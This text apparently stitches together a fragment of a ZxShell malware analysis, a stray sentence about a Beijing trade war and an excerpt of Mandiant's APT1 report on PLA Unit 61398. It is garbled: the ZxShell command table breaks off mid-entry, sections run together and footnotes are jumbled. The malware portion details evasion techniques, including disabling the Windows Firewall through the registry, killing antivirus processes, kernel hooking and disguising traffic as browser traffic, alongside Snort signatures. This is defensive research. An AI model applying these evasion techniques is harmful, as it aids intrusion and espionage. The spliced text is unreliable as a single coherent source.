Otherwise, the ZxShell code closes the socket used and sleeps for 30 seconds.It will then retry the connection with the next
remote host, if there is one.It is noteworthy that this function includes the code to set the ZxShell node as a server: if one of the hardcoded boolean value
is set to 1, a listening socket is created.The code waits for an incoming connection.When the connection is established a new
thread is spawned that starts with the MainConnectionIo function.</section>
<section>
<heading>MainConnectionIo</heading>

The MainConnectionIo function checks if the Windows Firewall is enabled, sets the Tcp Keep Alive value and Non-blocking
mode connection options and receives data from the remote host through the ReceiveCommandData function.If the
communication fails, ZxShell disables the firewall by modifying the registry key:

HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile

Then the connection is retried.The received command is then processed by the ZxShell function with the ProcessCommand
function.The command processing function starts by substituting the main module name and path in the hosting process PEB, with
the one of the default internet browser.The path of the main browser of the workstation is obtained by reading the registry
value:

HKLM\SOFTWARE\Classes\HTTP\shell\open\command

<figure></figure>


Image 5.Our test workstation use Windows Internet Explorer as default browser

This trick renders identification by firewall more cumbersome.A host firewall will recognize the outgoing connection as
originated by the browser instead of the ZxShell service host process.The browser process always performs outgoing
connections and the firewall shouldn’t block them.The command processing is straightforward.Here is the list of common commands:
<table>
 COMMAND         MEANING
 Help / ?The implementation is a userland keylogger that polls the
 KeyLog
                 keymap with each keystroke.Being able to transfer and execute files on the
infected system means the attacker can run any code they please.Further, the keylogging and remote desktop functionality
allows the operator to spy on the infected machine, observing all keystrokes and viewing all user actions.</section>
<section>
<heading>Uninstall</heading>

Unloads ZxShell and deletes all of the active components.This simply deletes the ZxShell service key from the Windows
registry (using SHDeleteKey Api) and all of the subkeys.Finally, it marks ZxShell main Dll for deletion with the MoveFileEx
Windows API.</section>
<section>
<heading>ZxFunction001</heading>

This function is the supporting functionality for WinVNC.To allow the VNC session to connect, the current network socket
WSAProtcol_Info structure is written to a named pipe prior to calling zxFunction001.Once the named pipe has been created,
CreateProcessAsUserA is called with the following as the CommandLine parameter :
<code>
<systemroot>\\rundll32.exe <zxshell dll name>,zxFunction001 <name of NamedPipe>
</code>
zxFunction001 modifies the current process memory, uses data contained in the named pipe to create a socket, and then
executes the code that sends the remote desktop session to the server controller.</section>
<section>
<heading>ZxFunction002</heading>

This function will either bind the calling process to a port or has the calling process connect to a remote host.The function is
called in the following manner:
<code>
<systemroot>\\rundll32.exe <zxshell dll name>,zxFunction002 <name of NamedPipe>
</code>
The functionality (connect or bind) depends on the data contained within the named pipe.Unlike zxFunction001, this is not
used by any of the RAT commands in the zxshell.dll.</section>
<section>
<heading>Kernel Device Driver LoveUSD</heading>

Apart from user-mode ZxShell droppers mentioned earlier, there is a file (SHA256:
1e200d0d3de360d9c32e30d4c98f07e100f6260a86a817943a8fb06995c15335) that installs a kernel device driver called
loveusd.sys.The architecture of this dropper is different from the others: it starts extracting the main driver from itself.It
adds the SeLoadDriver privilege to its access token and proceeds to install the driver as a fake disk filter driver.ZxShell opens
the registry key that describes the disk class drivers:

SYSTEM\CurrentControlSet\Control\Class\{4D36E967-E325-11CE-BFC1-08002BE10318}

It then adds the “Loveusd.sys” extracted driver name to the upper filter list.In our analysed sample the “Loveusd.sys” driver
is installed with the name “USBHPMS”.Finally the driver is started using the ZwLoadDriver native API.The ZxShell driver starts by acquiring some kernel information and then hooking “ObReferenceObjectByHandle” API.Finally
it spawns 2 system threads.The first thread is the “communication” thread.Its principal duties are to create the ZxShell main DLL in
“c:\Windows\System32\commhlp32.dll” and to install the Kernel “Load Image Notify routine”.The code then tries to kill
each process and service that belongs to the following list of AV products:

      Symantec Firewall
      Norton
      ESET
      McAfee
      Avast
      Avira
      Sophos
      Malwarebytes

Next, the ZxShell Load-Image Notify function prevents the AV processes from restarting.The installation procedure continues in the user-mode dropper.The ZxShell service is installed as usual, and the in-execution
dropper is deleted permanently using the special handle value 0x22222222 for the WriteFile API call.This handle value is
invalid: all the windows kernel handle values are by design a multiple of 4.The ZxShell hook code knows that and intercept
it.ObReferenceObjectByHandle is a Kernel routine designed to validate a target object and return the pointer to its object body
(and even its handle information), starting from the object handle (even the user-mode one).The hook installed by ZxShell
implements one of its filtering routine.It filters each attempt to open the ZxShell protected driver or the main DLL, returning
a reference to the “netstat.exe” file.The protection is enabled to all processes except for ones in the following list:
Svchost.exe, Lsass.exe, Winlogon.exe, Services.exe, Csrss.exe, ctfmon.exe, Rundll32.exe, mpnotify.exe, update.exe.If the type of the object that the system is trying to validate is a process, the hook code rewrites again the configuration data
of the ZxShell service in the windows registry.<figure></figure>


<caption>Image 6.Our test Windows XP workstation trying to open the sys file of ZxShell LOVEUSD driver</caption>

The last type of Kernel modification that ZxShell rootkit performs is the system call dispatcher (KiFastCallEntry) hook.In
this manner, ZxShell is able to completely hide itself, intercepting the following Kernel API calls: ZwAllocateVirtualMemory,
ZwOpenEvent, ZwQueryDirectoryFile, ZwWriteFile, ZwEnumerateKey, and ZwDeviceIoControlFile.</section>
<section>
<heading>Command and Control Server</heading>

Sample (SHA256: 1eda7e556181e46ba6e36f1a6bfe18ff5566f9d5e51c53b41d08f9459342e26c) is configured to act as a server.The symbol “g_bCreateListenSck” is set to 1.This means that, as seen above, the ZxShell Dll is started in listening mode.It
connects to the first remote C&C that tries to contact it and succeeds in the handshake.The encrypted IP address is
“127.0.0.2” (used as loopback) and no connection is made on that IP address (due to the listening variable set to 1).</section>
<section>
<heading>Malware Package</heading>

We used the ZxShell package for version 3.10 (SHA256:
1622460afbc8a255141256cb77af61c670ec21291df8fe0989c37852b59422b4).The convenient thing about this is that the CNC
panel worked with any version, 3.10 and above.The buttons are all in Chinese, with the help of Google Translate and keen
detective skills (read: button clicking), we’ve deciphered the functionality.When you start the controller, you need to set the port you want to listen on and if you’ve set a password, add it here.<figure></figure>

Once an infected machine connects, you see its information displayed in a selection box at the top.There are some built in
functions on the side for the more common features.These include remote desktop, webcam spying, remote shell, and file
management.You can also select a host and type help for a full list of commands.<figure></figure>

I have the same machine infected with two different version of ZxShell.Sending the help command for each, you can see the
extra features added between version 3.1 and 3.2.<figure></figure>

Keylogging, ZXARPS (IP and URL spoofing), and SYNFlood are some of the interesting features added to version 3.2.</section>
<section>
<heading>Version Information</heading>

We wrote a script to extract version info from the binaries we have.3.100 : 914
         3.200 : 152
         3.210 : 118
         3.220 : 14
         3.390 : 3

In versions 3.1 -- 3.21, the configuration info is xor encoded with 0x85.This configuration info can be changed with a tool
included in the ZxShell package.<figure></figure>

In versions 3.22 and 3.39 the routine changes.The new xor encoding byte is 0x5B.The data is stored in the last 0x100 bytes
of the file.The first 8 bytes of data are static.Then there is the dll install name, the domain, and the port.</section>
<section>
<heading>Extracted URL Analysis</heading>

Knowing the obfuscation routines for this data we wrote a script to extract the URLs / IPs and ports stored.The most common ports used are, 80, 1985, 1986, and 443.1985 is the default port for the malware, 1986 is the lazy variation
of that port.Port 80 and 443 are the default ports for HTTP and HTTPS traffic.The next most common is port 53.This is
used in some of the newer 3.22 and 3.39 samples.After that, the count for each port starts declining sharply.The choices are
interesting though, many correspond to what looks like the birth year of the controller (ie.years in the late 1980s and early
1990s), and others seem to match what year the malware was launched in (ie.in the 2000s, relatively close to the current
year).Since this malware dates back to around 2004, there are many samples containing CNC URLs from the 3322.org page.This
page used to offer no-ip type hosting and was widely used by malware authors.So much so that Microsoft did a takedown in
2012.A similar service, vicp.net, is also seen in many of the domains.In the malware, if a domain is configured, it will retrieve domain.tld/myip.txt.This file contains a list of IP addresses for the
infected machine to connect back to.Otherwise, if an IP address is configured, it will connect directly to that IP address.</section>
<section>
<heading>Cloning the ZxShell Server</heading>

We have written a simple C++ ZxShell Server that implements the communication and the handshake for the version 3.10
and 3.20 of the ZxShell DLL.The implementation is quite simple: After the handshake, 2 threads that deal with data transfer
are spawned.This makes the
keylogger a perfect weapons for the attackers.They will be able to steal and resell in the underground market the sensitive
data of each victim.</section>
<section>
<heading>Conclusion</heading>

Advanced persistent threats will remain a problem for companies and organizations of all sizes, especially those with high
financial or intellectual property value.Group 72’s involvement in Operation SMN is another example of what sort of
damage that can be done if organizations are not diligent in their efforts to secure their networks.ZxShell is one sample
amongst several tools that Group 72 used within their campaign.ZxShell is a sophisticated tool employed by Group 72 that contains all kinds of functionality.Its detection and removal can
be difficult due to the various techniques used to conceal its presence, such as disabling the host anti-virus, masking its
installation on a system with a valid service name, and by masking outbound traffic as originating from a web browser.While other techniques are also utilized to conceal and inhibit its removal, ZxShell’s primary functionality is to act as a
Remote Administration Tool (RAT), allowing the threat actor to have continuous backdoor access on to the compromised
machine.As our analysis demonstrates, ZxShell is an effective tool that can be ultimately used to steal user credentials and other highly
valuable information.The threat posed by ZxShell to organizations is one that cannot be ignored.Organizations with high
financial or intellectual property value should take the time to ensure their security requirements are met and that
employee’s are educated about the security threats their organizations face.For additional information, please see our blog post.</section>
<section>
Protecting Users from These Threats

                                   Advanced Malware Protection (AMP) is ideally suited to detect the sophisticated malware
                                   used by this threat actor.<figure></figure>
                                   CWS or WSA web scanning prevents access to malicious websites, including watering hole
                                   attacks, and detects malware used in these attacks.The Network Security protection of IPS and NGFW have up-to-date signatures to detect
                                   malicious network activity by threat actors.ESA can block spear phishing emails sent by threat actors as part of their campaign.</section>
<section>
<heading>Appendix A: Snort Rules</heading>

Initial connection from the infected computer’s perspective -- after it connects to the controller -
<list>
RECV:       85190000250400000000404000000000
SEND:       86190000040100006666464000000000
RECV:       4edf9340780100000000000000000000
SEND:       00000000000000000000000000000000
</list>
The rules are on the first 8 bytes of the first two packets.They are hard coded in the binaries.The rest of the bytes are
variable (for example, 66664640 is a floating point version number of ZxShell).Please run freshclam to ensure you stay updated with the latest
coverage.Here is a list of Domains organized by port.Tags: APT, Group 72, malware, Operation SMN, security, SMN, Talos, threats
</section>
</doc>Beijing is waging a massive trade war on us all, and we should
                    band together to pressure them to stop.pdf, accessed February 6, 2013.2	
   “Chinese hackers suspected in attack on The Post’s computers.” The Washington Post, Feb. 1, 2013, http://www.washingtonpost.com/business/
technology/chinese-hackers-suspected-in-attack-on-the-posts-computers/2013/02/01/d5a44fde-6cb1-11e2-bd36-c0fe61a205f6_story.html,
accessed Feb. 1, 2013.</footnote>

<footer>
Mandiant APT1	                                                          1	                                                  www.mandiant.com
</footer>
 
<section>
    <heading>Executive Summary</heading>

Since 2004, Mandiant has investigated computer security breaches at hundreds of organizations around the world.The majority of these security breaches are attributed to advanced threat actors referred to as the “Advanced Persistent
Threat” (APT).We first published details about the APT in our January 2010 M-Trends report.As we stated in the
report, our position was that “The Chinese government may authorize this activity, but there’s no way to determine the
extent of its involvement.” Now, three years later, we have the evidence required to change our assessment.The details
we have analyzed during hundreds of investigations convince us that the groups conducting these activities are based
primarily in China and that the Chinese Government is aware of them.<fn>3</fn>

Mandiant continues to track dozens of APT groups around the world; however, this report is focused on the most
prolific of these groups.We refer to this group as “APT1” and it is one of more than 20 APT groups with origins in
China.APT1 is a single organization of operators that has conducted a cyber espionage campaign against a broad
range of victims since at least 2006.From our observations, it is one of the most prolific cyber espionage groups in
terms of the sheer quantity of information stolen.The scale and impact of APT1’s operations compelled us to write this
report.The activity we have directly observed likely represents only a small fraction of the cyber espionage that APT1 has
conducted.Though our visibility of APT1’s activities is incomplete, we have analyzed the group’s intrusions against
nearly 150 victims over seven years.From our unique vantage point responding to victims, we tracked APT1 back
to four large networks in Shanghai, two of which are allocated directly to the Pudong New Area.We uncovered a
substantial amount of APT1’s attack infrastructure, command and control, and modus operandi (tools, tactics, and
procedures).In an effort to underscore there are actual individuals behind the keyboard, Mandiant is revealing three
personas we have attributed to APT1.These operators, like soldiers, may merely be following orders given to them by
others.Our analysis has led us to conclude that APT1 is likely government-sponsored and one of the most persistent of China’s
cyber threat actors.We believe that APT1 is able to wage such a long-running and extensive cyber espionage campaign
in large part because it receives direct government support.In seeking to identify the organization behind this activity,
our research found that People’s Liberation Army (PLA’s) Unit 61398 is similar to APT1 in its mission, capabilities, and
resources.PLA Unit 61398 is also located in precisely the same area from which APT1 activity appears to originate.</section>


<footnote>
3	
   Our conclusions are based exclusively on unclassified, open source information derived from Mandiant observations.None of the information in
this report involves access to or confirmation by classified intelligence.</footnote>

<footer>
Mandiant APT1	                                                          2	                                                  www.mandiant.com
</footer>

<section>
<heading>KEY FINDINGS</heading>

APT1 is believed to be the 2nd Bureau of the People’s Liberation Army (PLA) General Staff Department’s
(GSD) 3rd Department (总参三部二局), which is most commonly known by its Military Unit Cover
Designator (MUCD) as Unit 61398 (61398部队).»»   The nature of “Unit 61398’s” work is considered by China to be a state secret; however, we believe it engages in
     harmful “Computer Network Operations.”

»»   Unit 61398 is partially situated on Datong Road (大同路) in Gaoqiaozhen (高桥镇), which is located in the Pudong
     New Area (浦东新区) of Shanghai (上海).The central building in this compound is a 130,663 square foot facility
     that is 12 stories high and was built in early 2007.»»   We estimate that Unit 61398 is staffed by hundreds, and perhaps thousands of people based on the size of Unit
     61398’s physical infrastructure.»»   China Telecom provided special fiber optic communications infrastructure for the unit in the name of national
     defense.»»   Unit 61398 requires its personnel to be trained in computer security and computer network operations and also
     requires its personnel to be proficient in the English language.»»   Mandiant has traced APT1’s activity to four large networks in Shanghai, two of which serve the Pudong New Area
     where Unit 61398 is based.APT1 has systematically stolen hundreds of terabytes of data from at least 141 organizations, and has
demonstrated the capability and intent to steal from dozens of organizations simultaneously.<fn>4</fn>
»»   Since 2006, Mandiant has observed APT1 compromise 141 companies spanning 20 major industries.»»   APT1 has a well-defined attack methodology, honed over years and designed to steal large volumes of valuable
     intellectual property.»»   Once APT1 has established access, they periodically revisit the victim’s network over several months or years
     and steal broad categories of intellectual property, including technology blueprints, proprietary manufacturing
     processes, test results, business plans, pricing documents, partnership agreements, and emails and contact lists
     from victim organizations’ leadership.»»   APT1 uses some tools and techniques that we have not yet observed being used by other groups including two
     utilities designed to steal email — GETMAIL and MAPIGET.»»   APT1 maintained access to victim networks for an average of 356 days.<fn>5</fn> The longest time period APT1 maintained
     access to a victim’s network was 1,764 days, or four years and ten months.»»   Among other large-scale thefts of intellectual property, we have observed APT1 stealing 6.5 terabytes of
     compressed data from a single organization over a ten-month time period.»»   In the first month of 2011, APT1 successfully compromised at least 17 new victims operating in 10 different
     industries.<footnote>
4	
   We believe that the extensive activity we have directly observed represents only a small fraction of the cyber espionage that APT1 has conducted.Therefore, Mandiant is establishing the lower bounds of APT1 activities in this report.5	
   This is based on 91 of the 141 victim organizations.In the remaining cases, APT1 activity is either ongoing or else we do not have visibility into
the last known date of APT1 activity in the network.</footnote>

<footer>
Mandiant APT1	                                                              3	                                                    www.mandiant.com
</footer>

APT1 focuses on compromising organizations across a broad range of industries in English-speaking
countries.»»   Of the 141 APT1 victims, 87% of them are headquartered in countries where English is the native language.»»   The industries APT1 targets match industries that China has identified as strategic to their growth, including four of
     the seven strategic emerging industries that China identified in its 12th Five Year Plan.APT1 maintains an extensive infrastructure of computer systems around the world.»»   APT1 controls thousands of systems in support of their computer intrusion activities.»»   In the last two years we have observed APT1 establish a minimum of 937 Command and Control (C2) servers
     hosted on 849 distinct IP addresses in 13 countries.The majority of these 849 unique IP addresses were
     registered to organizations in China (709), followed by the U.S. (109).»»   In the last three years we have observed APT1 use fully qualified domain names (FQDNs) resolving to 988 unique
     IP addresses.»»   Over a two-year period (January 2011 to January 2013) we confirmed 1,905 instances of APT1 actors logging into
     their attack infrastructure from 832 different IP addresses with Remote Desktop, a tool that provides a remote user
     with an interactive graphical interface to a system.»»   In the last several years we have confirmed 2,551 FQDNs attributed to APT1.In over 97% of the 1,905 times Mandiant observed APT1 intruders connecting to their attack
infrastructure, APT1 used IP addresses registered in Shanghai and systems set to use the Simplified
Chinese language.»»   In 1,849 of the 1,905 (97%) of the Remote Desktop sessions APT1 conducted under our observation, the APT1
     operator’s keyboard layout setting was “Chinese (Simplified) — US Keyboard”.Microsoft’s Remote Desktop client
     configures this setting automatically based on the selected language on the client system.Therefore, the APT1
     attackers likely have their Microsoft® operating system configured to display Simplified Chinese fonts.»»   817 of the 832 (98%) IP addresses logging into APT1 controlled systems using Remote Desktop resolved back to
     China.»»   We observed 767 separate instances in which APT1 intruders used the “HUC Packet Transmit Tool” or HTRAN
     to communicate between 614 distinct routable IP addresses and their victims’ systems using their attack
     infrastructure.Of the 614 distinct IP addresses used for HTRAN communications:
     −− 614 of 614 (100%) were registered in China.−− 613 (99.8%) were registered to one of four Shanghai net blocks.<footer>
Mandiant APT1	                                               4	                                         www.mandiant.com
</footer>

The size of APT1’s infrastructure implies a large organization with at least dozens, but potentially
hundreds of human operators.»»   We conservatively estimate that APT1’s current attack infrastructure includes over 1,000 servers.»»   Given the volume, duration and type of attack activity we have observed, APT1 operators would need to be directly
     supported by linguists, open source researchers, malware authors, industry experts who translate task requests
     from requestors to the operators, and people who then transmit stolen information to the requestors.»»   APT1 would also need a sizable IT staff dedicated to acquiring and maintaining computer equipment, people who
     handle finances, facility management, and logistics (e.g., shipping).In an effort to underscore that there are actual individuals behind the keyboard, Mandiant is revealing
three personas that are associated with APT1 activity.»»   The first persona, “UglyGorilla”, has been active in computer network operations since October 2004.His activities
     include registering domains attributed to APT1 and authoring malware used in APT1 campaigns.“UglyGorilla”
     publicly expressed his interest in China’s “cyber troops” in January 2004.»»   The second persona, an actor we call “DOTA”, has registered dozens of email accounts used to conduct social
     engineering and spear phishing attacks in support of APT1 campaigns.“DOTA” used a Shanghai phone number
     while registering these accounts.»»   We have observed both the “UglyGorilla” persona and the “DOTA” persona using the same shared infrastructure,
     including FQDNs and IP ranges that we have attributed to APT1.»»   The third persona, who uses the nickname “SuperHard,” is the creator or a significant contributor to the AURIGA
     and BANGAT malware families which we have observed APT1 and other APT groups use.“SuperHard” discloses
     his location to be the Pudong New Area of Shanghai.Mandiant is releasing more than 3,000 indicators to bolster defenses against APT1 operations.»»   Specifically, Mandiant is providing the following:
     −− Digital delivery of over 3,000 APT1 indicators, such as domain names, IP addresses, and MD5 hashes of
        malware.−− Sample Indicators of Compromise (IOCs) and detailed descriptions of over 40 families of malware in APT1’s
        arsenal of digital weapons.−− Thirteen (13) X.509 encryption certificates used by APT1.−− A compilation of videos showing actual attacker sessions and their intrusion activities.»»   While existing customers of Mandiant’s enterprise-level products, Mandiant Managed Defense and Mandiant
     Intelligent Response®, have had prior access to these APT1 Indicators, we are also making them available for use
     with Redline™, our free host-based investigative tool.Redline can be downloaded at http://www.mandiant.com/
     resources/download/redline.</section>


<footer>
Mandiant APT1	                                              5	                                           www.mandiant.com
</footer>

<section>
<heading>Conclusion</heading>   
The sheer scale and duration of sustained attacks against such a wide set of industries from a singularly identified
group based in China leaves little doubt about the organization behind APT1.We believe the totality of the evidence
we provide in this document bolsters the claim that APT1 is Unit 61398.However, we admit there is one other unlikely
possibility:

        A secret, resourced organization full of mainland Chinese speakers with direct access to Shanghai-based
        telecommunications infrastructure is engaged in a multi-year, enterprise scale computer espionage campaign
        right outside of Unit 61398’s gates, performing tasks similar to Unit 61398’s known mission.</section>

<section>
<heading>Why We Are Exposing APT1</heading>
The decision to publish a significant part of our intelligence about Unit 61398 was a painstaking one.What started as
a “what if” discussion about our traditional non-disclosure policy quickly turned into the realization that the positive
impact resulting from our decision to expose APT1 outweighed the risk to our ability to collect intelligence on this
particular APT group.It is time to acknowledge the threat is originating in China, and we wanted to do our part to arm
and prepare security professionals to combat that threat effectively.The issue of attribution has always been a missing
link in publicly understanding the landscape of APT cyber espionage.Without establishing a solid connection to China,
there will always be room for observers to dismiss APT actions as uncoordinated, solely criminal in nature, or peripheral
to larger national security and global economic concerns.We hope that this report will lead to increased understanding
and coordinated action in countering APT network breaches.At the same time, there are downsides to publishing all of this information publicly.Many of the techniques and
technologies described in this report are vastly more effective when attackers are not aware of them.Additionally,
publishing certain kinds of indicators dramatically shortens their lifespan.When Unit 61398 changes their techniques
after reading this report, they will undoubtedly force us to work harder to continue tracking them with such accuracy.It
is our sincere hope, however, that this report can temporarily increase the costs of Unit 61398’s operations and impede
their progress in a meaningful way.We are acutely aware of the risk this report poses for us.We expect reprisals from China as well as an onslaught of
criticism.This section provides photos and details
of Unit 61398 facilities, Chinese references discussing the unit’s training and
coursework requirements, and internal Chinese communications documenting
the nature of the unit’s relationship with at least one state-owned enterprise.These details will be particularly relevant when we discuss APT1’s expertise,
personnel, location, and infrastructure, which parallel those of Unit 61398.</section>
<figure></figure>
<section>
<heading>The Communist Party of China</heading>
The PLA’s cyber command is fully institutionalized within the CPC and able to draw upon the resources of China’s state-
owned enterprises to support its operations.The CPC is the ultimate authority in Mainland China; unlike in Western
societies, in which political parties are subordinate to the government, the military and government in China are
subordinate to the CPC.In fact, the PLA reports directly to the CPC’s Central Military Commission (CMC, 中央军事委
员会).<fn>6</fn> This means that any enterprise cyber espionage campaign within the PLA is occurring at the direction of senior
members of the CPC.We believe that the PLA’s strategic cyber command is situated in the PLA’s General Staff Department (GSD,总参谋
部), specifically its 3rd Department (总参三部).<fn>7</fn> The GSD is the most senior PLA department.Similar to the U.S.
Joint Chiefs of Staff, the GSD establishes doctrine and provides operational guidance for the PLA.Within the GSD, the
3rd Department has a combined focus on signals intelligence, foreign language proficiency, and defense information



<footnote>
6	
  James C. Mulvenon and Andrew N. D. Yang, editors, The People’s Liberation Army as Organization: Reference Volume v1.0, (Santa Monica, CA:
RAND Corporation, 2002), 96, http://www.rand.org/pubs/conf_proceedings/CF182.html, accessed February 6, 2013.7	
  Bryan Krekel, Patton Adams, and George Bakos, “Occupying the Information High Ground: Chinese Capabilities for Computer Network Operations
and Cyber Espionage,” Prepared for the U.S.-China Economic and Security Review Commission by Northrop Grumman Corp (2012): 10, http://www.uscc.gov/RFP/2012/USCC%20Report_Chinese_CapabilitiesforComputer_NetworkOperationsandCyberEspionage.pdf, accessed February 6, 2013.</footnote>

<footer>
Mandiant APT1	                                                       7	                                                www.mandiant.com
</footer>

systems.<fn>8</fn> It is estimated to have 130,000<fn>9</fn> personnel divided between 12 bureaus (局), three research institutes, and
16 regional and functional bureaus.<fn>10</fn> We believe that the GSD 3rd Department, 2nd Bureau (总参三部二局), is the
APT group that we are tracking as APT1.Figure 1 shows how close the 2nd Bureau sits to the highest levels of the
CPC.At this level, the 2nd Bureau also sits atop a large-scale organization of subordinate offices.9	
  Bryan Krekel, Patton Adams, and George Bakos, “Occupying the Information High Ground: Chinese Capabilities for Computer Network Operations
and Cyber Espionage,” Prepared for the U.S.-China Economic and Security Review Commission by Northrop Grumman Corp (2012): 47, http://www.uscc.gov/RFP/2012/USCC%20Report_Chinese_CapabilitiesforComputer_NetworkOperationsandCyberEspionage.pdf, accessed February 6, 2013.Ian Easton and Mark A. Stokes, “China’s Electronic Intelligence Satellite Developments: Implications for U.S. Air and Naval Operations,” Project
10	

2049 Institute (2011): 5, http://project2049.net/documents/china_electronic_intelligence_elint_satellite_developments_easton_stokes.pdf, accessed
February 6, 2013.James C. Mulvenon and Andrew N. D. Yang, editors, The People’s Liberation Army as Organization: Reference Volume v1.0, (Santa Monica, CA:
11	

RAND Corporation, 2002), 96, http://www.rand.org/pubs/conf_proceedings/CF182.html, accessed February 6, 2013.</section>

<section>
<heading>What is a MUCD?</heading>
Chinese military units are given MUCDs, five-digit numerical sequences, to provide basic anonymity for the unit in question and as a standardized reference that facilitates communications and operations (e.g., “Unit 81356 is moving to the objective,” versus “1st Battalion, 125th Regiment, 3rd Division, 14th Group Army is moving to the objective”).Military Unit Cover Designators are also used in official publications and on the Internet to refer to the unit in question.The MUCD numbers are typically displayed outside a unit’s barracks, as well as on the unit’s clothing, flags, and stationary.Source: The Chinese Army Today: Tradition and Transformation for the 21st Century — Dennis J. Blasko
</section>



<section>
<heading>Identifying GSD 3rd Department, 2nd Bureau as Unit 61398</heading>
The care with which the PLA maintains the separation between the GSD 3rd Department, 2nd Bureau, and the MUCD
61398 can be partially observed by searching the Internet for official documents from the Chinese government that
refer to both the 2nd Bureau and Unit 61398.Figure 2 shows the results of one of these queries.<figure></figure>


<caption>Figure 2: No results found for searching for “GSD 3rd Department 2nd Bureau” and “Unit 61398” on any
Chinese government websites</caption>

Despite our challenges finding a link between the Chinese Government and Unit 61398 online, our searches did find
references online indicating that the GSD 3rd Department, 2nd Bureau, is actually Unit 61398.Specifically, Google
indexed references to Unit 61398 in forums and resumes.Once these references were discovered by CPC censors,
these postings and documents were likely modified or removed from the Internet.Figure 3 shows Google search results

<footnote>
12	
   Mark A. Stokes, Jenny Lin, and L.C.Russell Hsiao, “The Chinese People’s Liberation Army Signals Intelligence and Cyber Reconnaissance
Infrastructure,” Project 2049 Institute (2011): 8, http://project2049.net/documents/pla_third_department_sigint_cyber_stokes_lin_hsiao.pdf,
accessed February 6, 2013.13	
   U.S. Department of Defense defines Computer Network Operations as “Comprised of computer network attack, computer network defense, and
related computer network exploitation enabling operations.Also called CNO.•	 computer network attack.Actions taken through the use of computer networks to disrupt, deny, degrade, or destroy information resident in
		 computers and computer networks, or the computers and networks themselves.Also called CNA.•	 computer network defense.Actions taken to protect, monitor, analyze, detect, and respond to unauthorized activity within the Department of
		 Defense information systems and computer networks.Also called CND.•	 computer network exploitation.Enabling operations and intelligence collection capabilities conducted through the use of computer networks to
		 gather data from target or adversary automated information systems or networks.Also called CNE.”
U.S. Department of Defense, The Dictionary of Military Terms (New York: Skyhorse Publishing, Inc.), 112.14	
   Mark A. Stokes, Jenny Lin, and L.C.Russell Hsiao, “The Chinese People’s Liberation Army Signals Intelligence and Cyber Reconnaissance
Infrastructure,” Project 2049 Institute (2011): 8, http://project2049.net/documents/pla_third_department_sigint_cyber_stokes_lin_hsiao.pdf,
accessed February 6, 2013.Former and current personnel from the unit have publicly alluded to these areas of emphasis.For
example, a graduate student of covert communications, Li Bingbing (李兵兵), who openly acknowledged his affiliation
with Unit 61398, published a paper in 2010 that discussed embedding covert communications within Microsoft® Word
documents.Another example is English linguist Wang Weizhong’s (王卫忠) biographical information, provided to the
Hebei (河北) Chamber of Commerce, which describes the training he received as an English linguist while assigned to
Unit 61398.These and other examples that demonstrate Unit 61398’s areas of expertise are listed in Table 1 below.<caption>Table 1: Chinese sources referring to the areas of expertise contained in Unit 61398</caption>

<table>
 Type of Expertise in Unit 61398 (部队) Source Describing that Expertise in Unit 61398
 Covert Communications                Article in Chinese academic journal.Second author Li Bingbing (李兵兵)
                                      references Unit 61398 as the source of his expertise on the topic.<fn>15</fn>
 English Linguistics                  Bio of Hebei Chamber of Commerce member Wang Weizhong (王卫忠).He describes that he received his training as an English linguist during his
                                      service in Unit 61398.(Hebei is a borough in Shanghai.)<fn>16</fn>
 Operating System Internals           Article in Chinese academic journal.Second author Yu Yunxiang (虞云翔)
                                      references Unit 61398 as the source of his expertise on the topic.<fn>17</fn>
 Digital Signal Processing            Article in Chinese academic journal.Second author Peng Fei (彭飞)
                                      references Unit 61398 as the source of his expertise on the topic.<fn>18</fn>
 Network Security                     Article in Chinese academic journal.Third author Chen Yiqun (陈依群)
                                      references Unit 61398 as the source of his expertise on the topic.<fn>19</fn>
</table>

<footnote>
  Li Bing-bing, Wang Yan-Bo, and Xu Ming, “An information hiding method of Word 2007 based on image covering,” Journal of Sichuan University
15	

(Natural Science Edition) 47 (2010), http://www.paper.edu.cn/journal/downCount/0490-6756(2010)S1-0031-06, accessed February 6, 2013.Hebei Chamber of Commerce, Bio of member Wang Weizhong (2012), http://www.hbsh.org/shej_ejsheqmsg.16	

aspx?mid=26&uid=06010000&aid=06, accessed February 6, 2013.Zeng Fan-jing, Yu Yun-xiang, and Chang Li, “The Implementation of Overlay File System in Embedded Linux,” Journal of Information Engineering
17	

University 7 (2006), http://file.lw23.com/9/98/984/98401889-9da6-4c38-b9d2-5a5202fd1a33.pdf, accessed February 6, 2013.Zhao Ji-yong, Peng Fei, and Geng Chang-suo, “ADC’s Performance and Selection Method of Sampling Number of Bits,” Journal of Military
18	

Communications Technology 26, (2005), http://file.lw23.com/f/f1/f14/f14e7b60-3d60-4184-a48f-4a50dd21927c.pdf, accessed February 6, 2013.Chen Qiyun, Chen Xiuzhen, Chen Yiqun, and Fan Lei, “Quantization Evaluation Algorithm for Attack Graph Based on Node Score,” Computer
19	

Engineering 36 (2010), http://www.ecice06.com/CN/article/downloadArticleFile.do?attachType=PDF&id=19627, accessed February 7, 2013.</footnote>

<footer>
Mandiant APT1	                                                        10	                                                www.mandiant.com
</footer>

Additionally, there is evidence that Unit 61398 aggressively recruits new talent from the Science and Engineering
departments of universities such as Harbin Institute of Technology (哈尔滨工业大学) and Zhejiang University School
of Computer Science and Technology (浙江大学计算机学院).The majority of the “profession codes” (专业代码)
describing positions that Unit 61398 is seeking to fill require highly technical computer skills.The group also appears
to have a frequent requirement for strong English proficiency.This is an extrapolation based on public disclosures from within China describing the location
and physical installations associated with Unit 61398.For example, public sources confirm that in early 2007, Jiangsu
Longhai Construction Engineering Group (江苏龙海建工集团有限公司) completed work on a new building for Unit
61398 located at Datong Road 208 within the Pudong New Area of Shanghai (上海市浦东新区高桥镇大同路208号),<fn>21</fn>
which is referred to as the “Unit 61398 Center Building” (61398部队中心大楼).At 12 stories in height, and offering
130,663 square feet of space, we estimate that this building houses offices for approximately 2,000 people.Figure 4
through Figure 7 provide overhead views and street-level views of the building and its location, showing its size.This is
only one of the unit’s several buildings, some of which are even larger.The close proximity of these amenities supports the contention that Unit
61398 occupies a high-level position in the PLA organizational hierarchy (see Figure 1: Unit 61398’s positions within
the PLA).<fn>24</fn>
</section>

<section>
<heading>PLA Unit 61398 and State-Owned Enterprise China Telecom are Co-building Computer Network
Operations Infrastructure</heading>
Mandiant found an internal China Telecom document online that provides details about the infrastructure provided
to Unit 61398.The memo (in Figure 8) reveals China Telecom executives deciding to “co-build” with Unit 61398 to
justify the use of their own inventory in the construction of fiber optic communication lines “based on the principle that
